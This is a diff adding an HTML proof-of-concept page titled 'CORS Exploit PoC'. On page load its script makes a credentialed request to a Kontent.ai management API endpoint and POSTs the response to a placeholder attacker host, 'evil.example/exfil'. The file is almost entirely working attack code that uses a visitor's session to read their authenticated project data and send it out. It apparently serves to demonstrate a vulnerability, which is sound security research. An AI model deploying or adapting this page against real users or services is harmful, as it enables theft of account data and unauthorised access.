@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <script>
+    fetch("https://manage.kontent.ai/v2/projects", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      // Exfiltrate to attacker server
+      fetch("https://evil.example/exfil", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ stolenData: data })
+      });
+    })
+    .catch(err => console.error("PoC failed:", err));
+  </script>
+  <h1>PoC Loaded</h1>
+</body>
+</html>
